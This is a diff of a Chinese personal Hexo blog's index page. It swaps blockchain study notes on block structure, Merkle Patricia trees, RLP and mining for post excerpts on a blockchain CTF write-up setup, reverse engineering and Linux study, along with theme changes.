-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-05 21:56:38" itemprop="dateModified" datetime="2022-03-05T21:56:38+08:00">2022-03-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><p>一个写的很好的中文 <strong>比特币</strong> （可能不适用于以太坊）笔记网址，包含了100篇区块链偏向技术和底层知识的博客：<a target="_blank" rel="noopener" href="http://www.btccfo.com/category/note/">http://www.btccfo.com/category/note/</a></p>
-<h2 id="区块结构"><a href="#区块结构" class="headerlink" title="区块结构"></a>区块结构</h2><p>包括 <strong>区块头</strong> 和 <strong>区块体</strong> </p>
+          <p>一个写的很好的中文 <strong>比特币</strong> （可能不适用于以太坊）笔记网址，包含了100篇区块链偏向技术和底层知识的博客：<a target="_blank" rel="noopener" href="http://www.btccfo.com/category/note/">http://www.btccfo.com/category/note/</a></p>
+<h1 id="区块结构"><a href="#区块结构" class="headerlink" title="区块结构"></a>区块结构</h1><p>包括 <strong>区块头</strong> 和 <strong>区块体</strong> </p>
 <p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-block.jpg" alt="image"></p>
-<ol>
-<li><p>区块头</p>
-<p>主要包含了一系列的数值、引用的数值以及哈希值。特别注意有三棵树（状态树、交易树、收据树）的根哈希都存放在区块头中。</p>
-</li>
-<li><p>区块体</p>
-<p>包含 叔块 和 交易列表。这里的交易列表是指一系列交易本身（即包含了to，from，data等信息）</p>
-</li>
-</ol>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ice_fire_x/article/details/104211388">https://blog.csdn.net/ice_fire_x/article/details/104211388</a></p>
-<p>和<a target="_blank" rel="noopener" href="https://github.com/laalaguer/ethereum-compass/issues/13">https://github.com/laalaguer/ethereum-compass/issues/13</a></p>
-<h2 id="Merkle-Patricia-tree（MTP）"><a href="#Merkle-Patricia-tree（MTP）" class="headerlink" title="Merkle Patricia tree（MTP）"></a>Merkle Patricia tree（MTP）</h2><p>Merkle Patricia tree是融合了Merkle树和Patricia树（路径压缩前缀树）的结构而形成的。</p>
-<h3 id="Merkle树"><a href="#Merkle树" class="headerlink" title="Merkle树"></a>Merkle树</h3><p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37504041/article/details/80474636">https://blog.csdn.net/weixin_37504041/article/details/80474636</a></p>
-<h3 id="Patricia树"><a href="#Patricia树" class="headerlink" title="Patricia树"></a>Patricia树</h3><p>Patricia树的理解：Trie-&gt;基数树（Patricia树）</p>
-<ol>
-<li><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Trie">Trie</a></p>
-<p>称为前缀树或者字典树。用于保存关联数组，其中的键通常是字符串。</p>
-<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-trie.PNG"></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9F%BA%E6%95%B0%E6%A0%91">基数树（Patricia树）</a></p>
-<p>是一种更节省空间的Trie（前缀树），其中作为唯一子节点的每个节点都与其父节点合并，边既可以表示为元素序列又可以表示为单个元素</p>
-</li>
-</ol>
-<h3 id="MTP"><a href="#MTP" class="headerlink" title="MTP"></a>MTP</h3><p>******待完成</p>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/itleaks/article/details/79992072">https://blog.csdn.net/itleaks/article/details/79992072</a></p>
-<h2 id="RLP编码和解码"><a href="#RLP编码和解码" class="headerlink" title="RLP编码和解码"></a>RLP编码和解码</h2><p>简单来说，RLP就是一种序列化和反序列化的编码模式。</p>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ggq89/article/details/78629008">https://blog.csdn.net/ggq89/article/details/78629008</a></p>
-<h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><ol>
-<li><h5 id="生成Merkle根哈希"><a href="#生成Merkle根哈希" class="headerlink" title="生成Merkle根哈希"></a>生成Merkle根哈希</h5><p>矿工创建区块的第一笔交易，称为Coinbase，这笔交易与其他所有即将打包的交易一起通过Merkle树算法生成Merkle根哈希</p>
-<blockquote>
-<p>打包：在挖矿之前，对于当前这个矿工来说，新区块会包含哪些交易就已经确定好了的。这些被确定被包含的交易就是矿工打包的交易。</p>
-</blockquote>
-</li>
-<li><h5 id="组装区块头"><a href="#组装区块头" class="headerlink" title="组装区块头"></a>组装区块头</h5><p>组装区块头就很简单了，矿工会把上一步计算得到的Merkle根哈希，与随机数Nonce、上个区块hash、难度值、时间戳以及版本号组装成一个区块头。这里的随机数是矿工唯一能改变的数值，矿工会不停的改变随机数，计算区块头的hash，直到得到的hash值匹配上全网目标值为止。</p>
-</li>
-<li><h5 id="计算目标值"><a href="#计算目标值" class="headerlink" title="计算目标值"></a>计算目标值</h5><p>即计算出符合区块链目标的值，比如满足前十个都是0的值</p>
-</li>
-</ol>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37504041/article/details/103792215">https://blog.csdn.net/weixin_37504041/article/details/103792215</a></p>
-<p>或<a target="_blank" rel="noopener" href="https://www.tangshuang.net/4097.html">https://www.tangshuang.net/4097.html</a></p>
-<h2 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h2><h3 id="全节点"><a href="#全节点" class="headerlink" title="全节点"></a>全节点</h3><ul>
-<li>存储完整的区块链数据。</li>
-<li>参与区块验证，验证所有区块和状态。</li>
-<li>所有状态都可以从一个全节点推出。</li>
-<li>为网络提供服务，并按照请求提供数据。</li>
-</ul>
-<h3 id="轻节点"><a href="#轻节点" class="headerlink" title="轻节点"></a>轻节点</h3><ul>
-<li>存储头链并请求其他所有内容。</li>
-<li>可以对照区块头中的状态根来验证数据的有效性。</li>
-<li>对于低容量的设备，如嵌入式设备或移动电话来说是有用的，这些设备无法储存数千兆字节的区块链数据。</li>
-</ul>
-<h3 id="归档节点"><a href="#归档节点" class="headerlink" title="归档节点"></a>归档节点</h3><ul>
-<li>存储保留在全节点中的所有内容，并建立一个历史状态的归档。 如果您想查询区块 #4,000,000 的帐户余额等内容，或者简单可靠地<a target="_blank" rel="noopener" href="https://openethereum.github.io/JSONRPC-trace-module#trace_callmany">使用 OpenEthereum 在不挖坑的情况下测试自己的交易集</a>，就需要这样做。</li>
-<li>这些数据的数据量会达到TB级别，这使得存档节点对普通用户的吸引力降低，但对于诸如区块浏览器、钱包供应商和链分析之类的服务而言却很方便。</li>
-</ul>
-<p>以存档以外的任何方式同步客户端将导致修剪的区块链数据。 这意味着，没有所有历史状态的档案，但是整个节点都可以按需构建它们。</p>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://ethereum.org/zh/developers/docs/nodes-and-clients/#node-types">https://ethereum.org/zh/developers/docs/nodes-and-clients/#node-types</a></p>
-<h2 id="同步策略"><a href="#同步策略" class="headerlink" title="同步策略"></a>同步策略</h2><h3 id="完全同步"><a href="#完全同步" class="headerlink" title="完全同步"></a>完全同步</h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%98%E6%96%B9CTF%E9%A2%98%20write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Karry-Almond">
+      <meta itemprop="description" content="Karry的成长历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Karry blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%98%E6%96%B9CTF%E9%A2%98%20write-up/" class="post-title-link" itemprop="url">区块链官方CTF题 write-up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:22:48" itemprop="dateModified" datetime="2022-03-22T13:22:48+08:00">2022-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>官方网站：<a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/">https://capturetheether.com/challenges/</a></p>
+<p>做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 <code>Begin Challenge</code> ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击 <code>Check Solution</code> ，同样metamask会弹出是否发送消息的对话框，点击确定，完成验证。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%98%E6%96%B9CTF%E9%A2%98%20write-up/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/%E8%B5%84%E6%BA%90%E5%88%97%E8%A1%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Karry-Almond">
+      <meta itemprop="description" content="Karry的成长历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Karry blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/%E8%B5%84%E6%BA%90%E5%88%97%E8%A1%A8/" class="post-title-link" itemprop="url">资源列表</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:22:24" itemprop="dateModified" datetime="2022-03-22T13:22:24+08:00">2022-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%84%E6%BA%90/" itemprop="url" rel="index"><span itemprop="name">资源</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>记录一些资源网站，包括但不限于学习网站、CTF网站、面经网站、工具网站、搞笑有趣网站等等。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/%E8%B5%84%E6%BA%90%E5%88%97%E8%A1%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Karry-Almond">
+      <meta itemprop="description" content="Karry的成长历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Karry blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">逆向学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:18:14" itemprop="dateModified" datetime="2022-03-22T13:18:14+08:00">2022-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>慢慢积累传统方向的逆向知识。包括加壳、去壳、静态分析、动态调试的方法等等。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Karry-Almond">
+      <meta itemprop="description" content="Karry的成长历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Karry blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">鸟哥的Linux私房菜学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:18:44" itemprop="dateModified" datetime="2022-03-22T13:18:44+08:00">2022-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>鸟哥的linux私房菜读书笔记，从基础到底层理解linux。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1214,10 +806,10 @@
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -1229,16 +821,20 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
   <p class="site-author-name" itemprop="name">Karry-Almond</p>
-  <div class="site-description" itemprop="description">区块链</div>
+  <div class="site-description" itemprop="description">Karry的成长历程</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">9</span>
-          <span class="site-state-item-name">posts</span>
+          <a href="/archives">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
 </div>
@@ -1270,8 +866,10 @@
   </span>
   <span class="author" itemprop="copyrightHolder">Karry-Almond</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
+-->
 
         
 
@@ -1297,7 +895,7 @@
 <script src="/js/motion.js"></script>
 
 
-<script src="/js/schemes/muse.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
 <script src="/js/next-boot.js"></script>
